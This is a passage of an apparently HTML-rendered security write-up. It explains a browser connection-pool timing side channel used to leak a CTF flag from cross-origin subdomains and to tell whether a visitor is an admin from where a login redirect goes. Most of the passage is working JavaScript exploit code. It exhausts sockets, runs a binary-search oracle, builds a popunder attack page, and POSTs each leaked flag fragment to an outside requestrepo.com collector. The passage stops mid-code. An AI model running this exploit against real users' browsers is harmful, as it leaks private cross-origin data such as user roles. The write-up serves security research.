-</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">controller</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">// exhausts all sockets except one
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">exhaust_sockets</span> <span class="o">=</span> <span class="kr">async</span><span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">SOCKETLIMIT</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">controller</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">block_socket</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">controllers</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">controller</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>Then, we need a way to detect which request goes first. My exploit does the following:</p>
-<ul>
-<li>Exhausts the entire pool</li>
-<li>Triggers the challenge&rsquo;s cross-origin request (priority: High)</li>
-<li>Sends our request to <code>&lt;our-guess&gt;&lt;char-to-brute&gt;FFF.attacker.com</code> (same priority as the previous one)</li>
-<li>Frees exactly one socket and immediately sends a request to a host that is always lexicographically smallest (eg. <code>0000.attacker.com</code>) and responds after a measurable delay (eg. ~250ms). Only one of the two passes, the other stalls.</li>
-<li>If the first request completes quickly (&lt; ~250ms), then our host is lexicographically smaller than the challenge one. If it takes much longer, it&rsquo;s greater (&gt; ~600ms).</li>
-<li>Performs a binary search on the unknown subdomain using this oracle</li>
-<li>Repeats until the entire flag is leaked</li>
-</ul>
-<p>
-    <img src="/images/leak1.gif" loading="lazy" decoding="async" alt="leak gif"></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">fetch_leak</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">qq</span><span class="p">,</span> <span class="nx">threshold</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">start</span> <span class="o">=</span> <span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://</span><span class="si">${</span><span class="nx">qq</span><span class="si">}</span><span class="sb">FFFFFF.</span><span class="si">${</span><span class="nx">MYSERVER</span><span class="si">}</span><span class="sb">/0?q=</span><span class="si">${</span><span class="nx">qq</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;no-cors&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">method</span><span class="o">:</span> <span class="s2">&#34;HEAD&#34;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">});</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nx">log</span><span class="p">(</span><span class="sb">`fetch_leak(</span><span class="si">${</span><span class="nx">qq</span><span class="si">}</span><span class="sb">) took </span><span class="si">${</span><span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">-</span> <span class="nx">start</span><span class="si">}</span><span class="sb">ms`</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">-</span> <span class="nx">start</span> <span class="o">&gt;</span> <span class="nx">threshold</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">async</span> <span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">leak</span><span class="p">,</span> <span class="nx">w</span><span class="p">,</span> <span class="nx">threshold</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">charset</span> <span class="o">=</span> <span class="s2">&#34;0123456789ABCDEF&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">lo</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">hi</span> <span class="o">=</span> <span class="nx">charset</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">mid</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="nx">lo</span> <span class="o">&lt;=</span> <span class="nx">hi</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">res_blocker_controller</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch_sleep_long</span><span class="p">(</span><span class="mi">1337</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            <span class="nx">log</span><span class="p">(</span><span class="s2">&#34;blocked last socket&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">log</span><span class="p">(</span><span class="s2">&#34;changing location&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            <span class="c1">// here the cross-origin request is triggered
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">w</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="sb">`</span><span class="si">${</span><span class="nx">TARGET</span><span class="si">}</span><span class="sb">#b`</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">midIndex</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">((</span><span class="nx">lo</span> <span class="o">+</span> <span class="nx">hi</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">mid</span> <span class="o">=</span> <span class="nx">charset</span><span class="p">[</span><span class="nx">midIndex</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">promise1</span> <span class="o">=</span> <span class="nx">fetch_leak</span><span class="p">(</span><span class="nx">leak</span> <span class="o">+</span> <span class="nx">mid</span><span class="p">,</span> <span class="nx">threshold</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">res_blocker_controller</span><span class="p">.</span><span class="nx">abort</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">promise2</span> <span class="o">=</span> <span class="nx">loadFont</span><span class="p">(</span><span class="s2">&#34;asdasd&#34;</span><span class="p">,</span> <span class="sb">`http://000000.</span><span class="si">${</span><span class="nx">MYSERVER</span><span class="si">}</span><span class="sb">/ssleep/250`</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">is_lower</span> <span class="o">=</span> <span class="o">!</span><span class="p">(</span><span class="kr">await</span> <span class="nx">promise1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="kr">await</span> <span class="nx">promise2</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_lower</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="nx">lo</span> <span class="o">=</span> <span class="nx">midIndex</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="nx">hi</span> <span class="o">=</span> <span class="nx">midIndex</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            <span class="nx">log</span><span class="p">(</span><span class="s2">&#34;changing location again&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            <span class="nx">w</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="sb">`</span><span class="si">${</span><span class="nx">TARGET</span><span class="si">}</span><span class="sb">#a`</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nx">mid</span> <span class="o">=</span> <span class="nx">charset</span><span class="p">[</span><span class="nx">lo</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">mid</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">async</span> <span class="kd">function</span> <span class="nx">main</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">myserver_timing</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">measure_fetch_leak</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">target_timing</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">measure_fetch_target</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">font_timing</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">measure_font</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nx">log</span><span class="p">(</span><span class="sb">`Threshold: </span><span class="si">${</span><span class="nx">myserver_timing</span> <span class="o">+</span> <span class="nx">target_timing</span> <span class="o">+</span> <span class="nx">font_timing</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">exhaust_sockets</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">start</span> <span class="o">=</span> <span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nx">w</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">TARGET</span><span class="si">}</span><span class="sb">#a`</span><span class="p">,</span> <span class="s2">&#34;_blank&#34;</span><span class="p">,</span> <span class="s2">&#34;width=800,height=600&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">leak</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span> <span class="c1">// flag{
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nx">tryDecodeHex</span><span class="p">(</span><span class="nx">leak</span><span class="p">).</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;}&#34;</span><span class="p">)){</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            <span class="nx">log</span><span class="p">(</span><span class="sb">`Testing for next character... Current leak: </span><span class="si">${</span><span class="nx">leak</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">c</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">test</span><span class="p">(</span><span class="nx">leak</span><span class="p">,</span> <span class="nx">w</span><span class="p">,</span> <span class="nx">myserver_timing</span> <span class="o">+</span> <span class="nx">target_timing</span> <span class="o">+</span> <span class="nx">font_timing</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">c</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">                <span class="nx">leak</span> <span class="o">+=</span> <span class="nx">c</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="nx">leak</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="p">}</span>
-</span></span><span class="line"><span class="cl">            
-</span></span><span class="line"><span class="cl">            <span class="nx">clear_log</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">log</span><span class="p">(</span><span class="sb">`Leaked: </span><span class="si">${</span><span class="nx">leak</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://xxxxxxxxxx.requestrepo.com/&#34;</span><span class="p">,</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="nx">body</span><span class="o">:</span> <span class="sb">`</span><span class="si">${</span><span class="nx">leak</span><span class="si">}</span><span class="sb">||</span><span class="si">${</span><span class="nx">tryDecodeHex</span><span class="p">(</span><span class="nx">leak</span><span class="p">)</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">                <span class="nx">mode</span><span class="o">:</span> <span class="s2">&#34;no-cors&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">                <span class="nx">method</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span>
-</span></span><span class="line"><span class="cl">            <span class="p">})</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nx">log</span><span class="p">(</span><span class="sb">`Final leak: </span><span class="si">${</span><span class="nx">leak</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">log</span><span class="p">(</span><span class="sb">`Time taken: </span><span class="si">${</span><span class="p">(</span><span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">-</span> <span class="nx">start</span><span class="p">)</span> <span class="o">/</span> <span class="mi">1000</span><span class="si">}</span><span class="sb"> seconds`</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nx">main</span><span class="p">();</span>
-</span></span></code></pre></div><p>This leaks the entire flag in ~70s.</p>
-<p>Flag: <code>flag{gj2e4syr1ght?}</code></p>
-
-<h3 id="poc">
-  <a class="full-clickable-heading" href="#poc">
-    PoC
-  </a>
-</h3>
-
-    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/kEyFQVGotwI?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
-    </div>
-
-
-<h2 id="leaking-redirect-hosts">
-  <a class="full-clickable-heading" href="#leaking-redirect-hosts">
-    Leaking redirect hosts
-  </a>
-</h2>
-<p>This technique also lets us leak where a redirect goes. I built a small demo app to illustrate it (source code 
-
-  <a href="https://gist.github.com/salvatore-abello/7d4fd69a098e1f80c900747dc1d3dae5" rel="noopener">here</a>
-
-). In short:</p>
-<ul>
-<li>Google acts as the OpenID Connect provider</li>
-<li>There are two roles: admins and users</li>
-<li>Each role has its own subdomain: admin.test.localhost.com (admins) and app.test.localhost.com (users).</li>
-<li>After login, the user is redirected to their subdomain.</li>
-<li>Hitting <code>/login</code> again auto-redirects to that subdomain.</li>
-</ul>
-<p>With our technique, we can tell in under two seconds whether a visitor is an admin or a regular user! The idea is similar to the subdomain trick, but redirects add an extra step: reqeusting <code>auth.localhost.com/login</code> triggers a second request (the redirect). We need to isolate that. We do this by freeing and re-blocking the last socket so the initial request completes while the redirect is forced to wait.</p>
-<p>From there, it&rsquo;s the same ordering oracle: choose a hostname that sorts between <code>admin</code> and <code>app</code>, let&rsquo;s say <code>ajj</code>. If the user is an admin, the redirect to <code>admin.test.localhost.com</code> will be scheduled before our request to <code>ajj.attacker.com</code>, so our request will be delayed. If the user is a regular user, the redirect goes to <code>app.test.localhost.com</code>, which sorts after <code>ajj.attacker.com</code>, so our request finishes immediately.</p>
-<p>Because the redirect navigation has <code>VeryHigh</code> priority, our requests must match that priority, a frame navigation works.</p>
-<p>Exploit steps:</p>
-<ul>
-<li>Exhaust the entire pool</li>
-<li>Open <code>auth.localhost.com/login</code> in a window</li>
-<li>Free exactly one socket and then immediately block it again, ensuring the first request gets scheduled while the redirect request remains pending.</li>
-<li>Trigger a frame navigation to <code>ajj.attacker.com</code> (same priority as the redirect)</li>
-<li>Free one socket and then re-block it immediately, forcing a &ldquo;race&rdquo; between the pending redirect and our pending frame navigation.</li>
-<li>Send a new frame navigation to a host that is always lexicographically smallest (eg. <code>0000000.attacker.com</code>) and make it take ~500ms to complete.</li>
-<li>Finally, free one socket and immediately re-block it. Our <code>0000000.attacker.com</code> request will always win the race, causing the pending one to hang for ~500 ms longer.</li>
-<li>If our request stalls, the redirect host sorts before <code>ajj.attacker.com</code> (<code>admin.test.localhost.com</code>). If our request finishes immediately, then the redirect host sorts after <code>ajj</code> (<code>app.test.localhost.com</code>)</li>
-</ul>
-<p>This single comparision is enough to distinguish admin vs user. If you had more than two candidates, you can extend it to a binary search just like before.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Hello world<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">button</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;popunder();&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">click me pls
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">w</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">popunder</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">w</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">opener</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">w</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="si">}</span><span class="sb">#1`</span><span class="p">,</span> <span class="nx">target</span><span class="o">=</span><span class="s2">&#34;_blank&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">location</span> <span class="o">=</span> <span class="sb">`about:blank`</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">SOCKETLIMIT</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">MYSERVER</span> <span class="o">=</span> <span class="sb">`...`</span><span class="p">;</span> <span class="c1">// eg. sleep.attacker.com
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">});</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">controllers</span> <span class="o">=</span> <span class="p">[];</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">async</span> <span class="kd">function</span> <span class="nx">loadIframe</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">iframe</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">name</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="s1">&#39;200px&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="s1">&#39;200px&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="s1">&#39;none&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">start</span> <span class="o">=</span> <span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">            
-</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">cleanup</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="kd">let</span> <span class="nx">end</span> <span class="o">=</span> <span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">-</span> <span class="nx">start</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&#34;about:blank&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="nx">resolve</span><span class="p">(</span><span class="nx">end</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="p">};</span>
-</span></span><span class="line"><span class="cl">            
-</span></span><span class="line"><span class="cl">            <span class="nx">iframe</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">cleanup</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">iframe</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="nx">cleanup</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">});</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">log</span> <span class="o">=</span> <span class="p">(</span><span class="nx">l</span><span class="p">,</span> <span class="nx">type</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">logtextarea</span><span class="p">.</span><span class="nx">value</span> <span class="o">+=</span> <span class="sb">`</span><span class="si">${</span><span class="nx">l</span><span class="si">}</span><span class="sb">\n`</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">logtextarea</span><span class="p">.</span><span class="nx">scrollTop</span> <span class="o">=</span> <span class="nx">logtextarea</span><span class="p">.</span><span class="nx">scrollHeight</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">fetch_sleep_long</span> <span class="o">=</span> <span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">controller</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">AbortController</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">signal</span> <span class="o">=</span> <span class="nx">controller</span><span class="p">.</span><span class="nx">signal</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://sleep</span><span class="si">${</span><span class="nx">i</span><span class="si">}</span><span class="sb">.</span><span class="si">${</span><span class="nx">MYSERVER</span><span class="si">}</span><span class="sb">/360?q=</span><span class="si">${</span><span class="nx">i</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;no-cors&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">signal</span><span class="o">:</span> <span class="nx">signal</span>
-</span></span><span class="line"><span class="cl">        <span class="p">});</span>
-</span></span><span class="line"><span class="cl">
